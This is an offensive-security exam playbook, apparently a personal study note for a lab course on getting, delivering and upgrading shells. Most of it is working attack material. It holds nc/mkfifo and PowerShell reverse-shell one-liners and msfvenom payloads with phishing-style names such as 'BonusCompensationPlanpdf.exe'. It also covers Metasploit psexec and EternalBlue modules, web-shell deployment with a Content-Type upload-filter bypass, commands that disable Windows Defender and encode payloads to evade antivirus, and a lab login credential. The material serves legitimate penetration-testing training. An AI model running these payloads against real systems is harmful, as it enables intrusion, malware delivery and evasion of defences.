# NOTE — Shells & Payloads Methodology (Exam Playbook)

## ID
720

## Module
Shells & Payloads

## Kind
methodology

## Title
Shells & Payloads — Get a Shell, Keep a Shell, Upgrade a Shell

## Description
Exam-ready playbook for turning an exploit primitive into a stable interactive session: pick shell type (bind vs reverse) → deliver payload (nc one-liner / PowerShell / msfvenom / Metasploit) → land on Windows or Linux → upgrade jail/web shell to interactive TTY. Decision-tree first; every command drawn from this vault's own notes.

## Tags
methodology, shells, payloads, exam, cheatsheet, decision-tree, reverse-shell, bind-shell, msfvenom, metasploit, meterpreter, web-shell, tty-upgrade, jail-shell, no-job-control, eternalblue, ms17-010, laudanum, antak, php-webshell, content-type-bypass, defender-blocked, war-shell, tomcat, pty-spawn

---

## TL;DR — The 5-Phase Flow

1. **Identify the target & shell context** — Windows or Linux? What interpreter? (`ping` TTL, `nmap -O`, `ps`/`env`).
2. **Choose shell direction** — **reverse by default** (egress beats ingress). Bind only if you can't catch a callback.
3. **Deliver the payload** — nc/bash one-liner, PowerShell one-liner, `msfvenom` standalone binary, or Metasploit module.
4. **Catch & verify** — listener up *before* triggering; confirm with `whoami` / `hostname`.
5. **Upgrade the shell** — jail/non-tty → interactive TTY (`pty.spawn` → fallbacks). Web shell → drop a real reverse shell, then delete the web shell.

> **Golden rule:** start the listener BEFORE you fire the payload, and set **LHOST to the IP the *target* can route to** (VPN/foothold internal IP — never Pwnbox's external IP on a pivot). A dead listener looks identical to a blocked payload — always check the listener side first.

> **OPSEC fork:** if Windows Defender silently eats a vanilla PowerShell/msfvenom payload, **don't burn exam time hand-obfuscating.** In lab/exam scope where you have a session: `Set-MpPreference -DisableRealtimeMonitoring $true`. Otherwise switch payload (`reverse_https`, stageless, encoded `-e x86/shikata_ga_nai`) or change vector entirely (web shell, different exploit). See Gotcha #1.

---

## Phase 1 — Identify Target & Shell Context

**Goal:** know the OS and interpreter before choosing a payload — wrong OS payload = silent fail.

| Trigger / Precondition | Action |
|---|---|
| Have an IP, nothing else | Fingerprint OS first |
| Already have a shell, unsure what it is | Identify the interpreter |

```bash
ping <IP>                              # TTL ~128 = Windows, ~64 = Linux, ~255 = Cisco
sudo nmap -v -O <IP>                   # OS detection → OS CPE line
sudo nmap -v <IP> --script banner.nse  # banner grab
nmap -sC -sV <IP>                      # service+script (app versions → searchsploit)
```

On a shell you already caught, identify the interpreter:

```bash
ps                 # active shell binary (bash / pwsh)
env                # look at SHELL=
echo $SHELL        # quick check
pwsh               # launch PowerShell Core on Linux
$PSVersionTable.PSEdition   # Core (pwsh/Linux) vs Desktop (full Win PS)
```

Prompt tells you fast: `$` = Bash/POSIX, `#` = root, `C:\...>` = cmd, `PS C:\...>` = PowerShell.
Ports 135/139/445 open → almost certainly Windows.

**Output checkpoint:** after this you have: OS + arch + interpreter → you know which payload family to build.

---

## Phase 2 — Choose Shell Direction

**Goal:** pick bind vs reverse so the network actually lets the connection through.

| Type | Listener | Connector | Use when |
|---|---|---|---|
| **Reverse** *(default)* | Attacker | Target | Almost always — outbound egress (esp. 443) is rarely filtered like inbound |
| **Bind** | Target | Attacker | Reverse impossible: no egress, or you can already run a listener on target and reach it inbound |

> Reverse wins because NAT/PAT + host firewalls block inbound; outbound on 80/443 is nearly always open. L7/DPI firewalls can still catch plaintext shells even on 443.

**Output checkpoint:** you know who listens and who connects → Phase 3 builds the matching payload.

---

## Phase 3 — Deliver the Payload

**Goal:** get code execution that calls back (or binds) a shell. Pick the lightest tool that fits the access you have.

### 3A — Raw nc / bash one-liners (Linux target, you have command exec)

```bash
# REVERSE — attacker listens, target dials home
sudo nc -lvnp 443                                                              # attacker
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> 443 > /tmp/f   # target

# BIND — target listens, attacker connects in
nc -lvnp 7777                                                                  # target (simple)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET-IP> 7777 > /tmp/f   # target (FIFO)
nc -nv <TARGET-IP> 7777                                                        # attacker connects
```

FIFO trick = makes a unidirectional pipe behave bidirectionally. `-i` is mandatory for an interactive bash.

### 3B — PowerShell reverse one-liner (Windows target, you have command exec)

```bash
sudo nc -lvnp 443    # attacker first
```
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
`-nop` (no profile) is essential. `iex` and `New-Object System.Net.Sockets.TCPClient` are the most-signatured strings → obfuscate these first if AV blocks.

### 3C — msfvenom standalone binary (no MSF-reachable exploit; phishing/USB/upload delivery)

```bash
msfvenom -l payloads                                                                       # list all
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=<LHOST> LPORT=443  -f elf > createbackup.elf
msfvenom -p windows/shell_reverse_tcp     LHOST=<LHOST> LPORT=443  -f exe > BonusCompensationPlanpdf.exe
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=9001 -f war -o managerUpdated.war   # Tomcat
sudo nc -lvnp 443                                                                          # catch it
```
**Staged vs stageless = read the separators:** `linux/x86/shell/reverse_tcp` (slash `/` → **staged**, tiny dropper + 2nd network call) vs `linux/zarch/meterpreter_reverse_tcp` (underscore `_` → **stageless**, one-shot, better for social-eng/low-bandwidth). `-f elf` = Linux, `-f exe` = Windows — wrong one = silent fail. Vanilla output is signatured → add `-e x86/shikata_ga_nai` or change payload.

### 3D — Metasploit module (you have creds or a known CVE)

```bash
sudo msfconsole              # or: msfconsole -q
search smb
use exploit/windows/smb/psexec
show options
set RHOSTS <IP>
set LHOST <LHOST>            # must be target-routable!
set SMBUser <user>
set SMBPass <pass>
set SHARE ADMIN$             # psexec needs admin share + admin creds
exploit
shell                        # from meterpreter → underlying system shell
```
If a module isn't in your local MSF but exists on Rapid7 GitHub: `locate exploits` → drop the `.rb` into the matching subdir (e.g. `/usr/share/metasploit-framework/modules/exploits/linux/http/`) → `use <path>`. All MSF modules are `.rb`. ExploitDB modules placed by `searchsploit` load via `use 50064.rb`.

**Output checkpoint:** payload is built/staged and the matching listener is running → trigger it, then Phase 4.

---

## Phase 4 — Catch & Verify

**Goal:** confirm the session is real before doing anything else.

| Trigger | Action |
|---|---|
| Listener shows no connection after trigger | Payload died pre-network (AV/wrong arch/wrong LHOST) — check Phase 1 OS, LHOST routability, Defender |
| Got a prompt | `whoami`, `hostname`, `id` — confirm host + privilege level |
| Meterpreter session | `?` for commands; `shell` to drop to system shell; `ls`/`cat` for flags |

`meterpreter > shell` → `C:\WINDOWS\system32>`. Web/exploit footholds usually land you as the **web/service user** (`apache`, `IUSR`, `IIS APPPOOL\...`), not root — privesc still required.

**Output checkpoint:** verified interactive (or semi-interactive) access as a known user → Phase 5 stabilises it.

---

## Phase 5 — Upgrade the Shell

**Goal:** turn a dumb/jail/web shell into a usable interactive TTY (so `su`, `sudo`, tab-complete, Ctrl-C work).

### 5A — Linux jail/non-tty → interactive TTY

```bash
which python || which python3                       # check first
python -c 'import pty; pty.spawn("/bin/sh")'        # preferred portable upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Python missing? Walk the fallback list (one is almost always present):

```bash
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'
find / -name <existing-file> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
# inside vim:  :set shell=/bin/sh  then  :shell
```
Swap `/bin/sh` for whatever exists (`/bin/bash`, `/bin/dash`, `/bin/ash`). After upgrading, seed privesc:

```bash
ls -la <path>     # ownership + perms
sudo -l           # needs a real interactive shell — no output = still in jail
```

### 5B — Web shell → real shell (web shells are a stepping stone, not a destination)

| Shell | Get it | Pre-use edit | Land at |
|---|---|---|---|
| **Laudanum** (multi-lang) | `cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx` | line ~59: add attacker IP to `allowedIps`; strip ASCII art | browse `/files/demo.aspx`, run `systeminfo` |
| **Antak** (ASP.NET/PS, IIS) | `cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx` | line 14: change creds (default `Disclaimer:ForLegitUseOnly`); strip art | browse `/files/Upload.aspx`, login, run PS |
| **WhiteWinterWolf PHP** | `git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git` | strip author comments | Burp: `Content-Type: application/x-php` → `image/gif`; browse `/images/vendor/<name>.php` |

Then **drop a proper reverse shell from the web shell and delete the web shell file** (auto-deletes, weak interactivity, forensic footprint). Match shell language to the server stack (PHP shell won't run on Tomcat).

**Output checkpoint:** stable interactive session you can run `sudo -l` / enumeration from → hand off to privesc module.

---

## Decision Tree (Under Exam Pressure)

```
Got code-exec / exploit primitive?
├── NO → not this module. Go find the vuln (web-attacks / common-apps / footprinting).
└── YES
    │
    ├── What OS?  (ping TTL / nmap -O / ports 445)
    │   ├── Windows → PowerShell one-liner (3B) OR msfvenom -f exe (3C) OR MSF module (3D)
    │   └── Linux   → nc/bash one-liner (3A) OR msfvenom -f elf (3C) OR MSF module (3D)
    │
    ├── Can you catch a callback? (egress out?)
    │   ├── YES → REVERSE shell  (default)
    │   └── NO  → BIND shell (3A bind variant)
    │
    ├── Fired payload, listener silent > 2 min?
    │   ├── Windows + Defender suspected → STUCK > 3 min → disable RTM (lab) / switch to reverse_https / encode -e / change vector
    │   ├── Wrong LHOST (pivot)?          → set LHOST to target-routable IP (ip a on foothold), retry
    │   ├── Wrong arch/format?            → rebuild: -f exe vs elf, x64 vs x86
    │   └── STUCK > 5 min → switch delivery method entirely (web shell / different exploit / MSF module)
    │
    ├── Got shell but it's dumb/jail (no tab, Ctrl-C kills it, sudo -l empty)?
    │   ├── Python present → pty.spawn (5A)
    │   ├── No Python      → walk fallback list perl→ruby→lua→awk→find→vim (5A)
    │   └── STUCK > 3 min → /bin/sh -i and accept "no job control", proceed to enum anyway
    │
    └── Only have a web shell?
        ├── Identify server lang → pick Laudanum/Antak/PHP (5B)
        ├── Upload blocked by filter → Burp Content-Type bypass (application/x-php → image/gif)
        └── Working → drop reverse shell from it → DELETE web shell → proceed
```

No branch dead-ends: every block has a `STUCK > N min → do Y`.

---

## Signal → Counter-Move Reference

| Signal / Symptom | Likely Cause | Exact Fix |
|---|---|---|
| Listener never gets a connection | AV killed payload pre-network | Disable Defender RTM (lab), or `reverse_https`/stageless/`-e x86/shikata_ga_nai`, or new vector |
| Connection on pivot never lands | LHOST = Pwnbox external IP, target can't route there | `ip a` on foothold → set LHOST to internal iface (e.g. `172.16.1.5`) |
| `sh: no job control in this shell` | Non-tty / jail shell | `python -c 'import pty; pty.spawn("/bin/bash")'` then `export TERM=xterm` |
| `sudo -l` returns nothing | Still in jail shell | Upgrade TTY first (5A); jail blocks sudo |
| PowerShell one-liner does nothing, no error | Defender signature block (silent) | Check listener side; `Set-MpPreference -DisableRealtimeMonitoring $true` (lab) |
| msfvenom binary won't execute on target | Wrong `-f` (elf vs exe) or wrong arch | Rebuild with correct format + explicit `x64` |
| `use <module>` → module not found | Module in Rapid7 GitHub but not local | `locate exploits` → drop `.rb` into matching subdir → `use <path>` |
| psexec module fails to auth | Not admin / wrong share | Need admin creds + `set SHARE ADMIN$`; regular user won't work |
| Web shell uploads but 403 / blank page | Laudanum IP allowlist not edited | Edit line ~59, add *attacker source IP* (VPN/tunnel, not host) |
| Upload form rejects `.php` | Content-Type / extension filter | Burp: change `Content-Type` to `image/gif`; add `GIF89a` magic bytes if magic-byte check |
| Web shell vanished mid-engagement | App auto-deletes uploads | Use it once to drop a reverse shell immediately; don't rely on it |
| Find+awk one-liner does nothing | Named file doesn't exist | Use a file that exists (`/etc/passwd`) or the direct `find . -exec /bin/sh \;` form |
| RDP paste drops characters | Pwnbox→RDP clipboard glitch | Paste into Notepad on target first, then copy locally |
| Bind `nc -l <ip> <port>` silent fail | Bound to wrong interface | Drop the IP: `nc -lvnp <port>` listens on all interfaces |
| Stale FIFO blocks bind listener | `/tmp/f` left from prior attempt | `rm -f /tmp/f` is part of the one-liner — re-run the full line |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === LISTENERS ===
sudo nc -lvnp 443                       # reverse-shell catcher (HTTPS port)
nc -nvlp 9001                           # WAR / generic catcher

# === LINUX TARGET: reverse shell ===
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST 443 > /tmp/f

# === LINUX TARGET: bind shell ===
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 7777 > /tmp/f   # target
nc -nv $TARGET 7777                                                                  # attacker

# === WINDOWS TARGET: PowerShell reverse one-liner ===
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Set-MpPreference -DisableRealtimeMonitoring $true     # lab-only Defender off

# === STANDALONE PAYLOADS (msfvenom) ===
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443  -f elf > createbackup.elf
msfvenom -p windows/shell_reverse_tcp   LHOST=$LHOST LPORT=443  -f exe > BonusCompensationPlanpdf.exe
msfvenom -p java/jsp_shell_reverse_tcp  LHOST=$LHOST LPORT=9001 -f war -o managerUpdated.war

# === METASPLOIT (creds/CVE) ===
msfconsole -q; use exploit/windows/smb/psexec
set RHOSTS $IP; set LHOST $LHOST; set SMBUser $U; set SMBPass $P; set SHARE ADMIN$; exploit
use auxiliary/scanner/smb/smb_ms17_010      # check EternalBlue
use exploit/windows/smb/ms17_010_psexec     # exploit EternalBlue → SYSTEM

# === TTY UPGRADE ===
python -c 'import pty; pty.spawn("/bin/bash")'   # then: export TERM=xterm ; (Ctrl-Z; stty raw -echo; fg)
perl -e 'exec "/bin/sh";' ; ruby -e 'exec "/bin/sh"' ; lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}' ; /bin/sh -i ; vim -c ':!/bin/sh'

# === WEB SHELLS ===
cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx                    # edit line ~59 allowedIps
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx         # edit line 14 creds
git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git  # Burp: Content-Type → image/gif

# === PIVOT FOOTHOLD ===
xfreerdp /v:$FOOTHOLD /u:htb-student /p:'HTB_@cademy_stdnt!'
ip a | grep "172.16.1.*"     # → use THIS as LHOST for all internal payloads
```

---

## Quick Reference — Tools by Function

| Function | Tool / Command |
|---|---|
| Catch a shell | `nc -lvnp <port>` |
| Linux one-liner shell | `mkfifo` + `/bin/bash -i` + `nc` |
| Windows one-liner shell | `powershell -nop -c "...TCPClient..."` |
| Standalone payload binary | `msfvenom -p ... -f elf\|exe\|war` |
| Automated exploit + shell | `msfconsole` exploit modules → Meterpreter |
| EternalBlue check / exploit | `auxiliary/scanner/smb/smb_ms17_010` → `exploit/windows/smb/ms17_010_psexec` |
| TTY upgrade (portable) | `python -c 'import pty; pty.spawn(...)'` |
| TTY upgrade (no Python) | perl / ruby / lua / awk / find / vim |
| Multi-lang web shell | Laudanum (`/usr/share/laudanum/`) |
| IIS PowerShell web shell | Antak (`/usr/share/nishang/Antak-WebShell/`) |
| PHP web shell | WhiteWinterWolf (`git clone`) |
| Upload filter bypass | Burp — edit `Content-Type` header |
| Defender off (lab) | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| OS fingerprint | `ping` TTL, `nmap -O`, `--script banner.nse` |
| Identify shell | `ps`, `env`, `echo $SHELL`, `$PSVersionTable` |

---

## Top Gotchas (exam-time foot-guns)

1. **Defender's block is SILENT.** Vanilla PS/msfvenom payload + no listener hit = it died pre-network, not "still loading". Don't keep waiting — check the listener, then change payload/disable RTM (lab).
2. **LHOST on a pivot must be the foothold's internal IP**, never Pwnbox's external IP — targets can't route back to Pwnbox. Always `ip a` on the foothold first.
3. **`sudo -l` / `su` need a real TTY.** Empty `sudo -l` output usually means you're still in a jail shell, not that the user has no sudo. Upgrade first (Phase 5A).
4. **Wrong `-f` format = silent fail.** `-f elf` for Linux, `-f exe` for Windows, `-f war` for Tomcat. Also default arch may be `x86` — specify `x64` for modern hosts.
5. **Web shells are temporary.** They auto-delete, break on command chaining, and leave artifacts. Use once to drop a reverse shell, then *delete the web shell file*.
6. **Laudanum IP allowlist** (line ~59) must contain your *actual source IP* (VPN/tunnel, not host) or you get 403/blank even on a successful upload.
7. **Antak default creds** `Disclaimer:ForLegitUseOnly` are public — change them every deploy or anyone who finds the shell logs in.
8. **Strip author comments / ASCII art** from any public web shell before upload — those strings are AV-signatured and identify the source.
9. **MSF GitHub > local install.** If `use` says module-not-found, drop the `.rb` into the matching `modules/exploits/...` subdir — extension must be `.rb`.
10. **psexec needs admin.** `ADMIN$`/`C$` share + admin creds. A regular domain user won't authenticate.
11. **Bind `nc -l <ip> <port>` binds to one interface** — wrong IP = silent failure. Drop the IP (`nc -lvnp <port>`) to listen on all.
12. **`-nop` and `-i` are not optional.** PowerShell needs `-nop` (profile can log/break it); bash one-liner needs `-i` (without it the prompt is dead).
13. **TTL is decremented per hop** — a TTL of 124 isn't "Linux+something", it's Windows (128) minus 4 hops. Subtract hops before judging OS.
14. **Module bind vs reverse semantics** — some MSF/ExploitDB PHP modules use `bind_tcp` (target listens). MSF handles it, but a manual listener must listen on the *target*, not the attacker.

---

## Related Vault Notes

- [[01-shells-jack-us-in]] · [[02-cat5-engagement-prep]] · [[03-anatomy-of-a-shell]]
- [[04-bind-shells]] · [[05-reverse-shells]] · [[06-introduction-to-payloads]]
- [[07-automating-payloads-metasploit]] · [[08-crafting-payloads-msfvenom]]
- [[09-infiltrating-windows]] · [[10-infiltrating-linux]] · [[11-spawning-interactive-shells]]
- [[12-introduction-to-web-shells]] · [[13-laudanum-webshell]] · [[14-antak-webshell]] · [[15-php-web-shells]]
- [[16-skills-assessment-live-engagement]] · [[17-detection-and-prevention]]

**Chains into:**
- Got a shell, need root/SYSTEM → [[../linux-privallege-escalation/00-METHODOLOGY]] / [[../windows-privesc/00-METHODOLOGY]]
- Shell on a foothold, more hosts behind it → [[../pivoting-tunneling/00-METHODOLOGY]]
- Web upload primitive feeding the web shell → [[../file-uploads/00-METHODOLOGY]] / [[../web-attacks/00-METHODOLOGY]]
- Need a CVE to get the initial exec → [[../attacking-common-applications/00-METHODOLOGY]]
- Deeper Metasploit usage → [[../using-the-metasploit/]] *(methodology pending)*

Triage by symptom: [[../ATTACK-PATHS]]
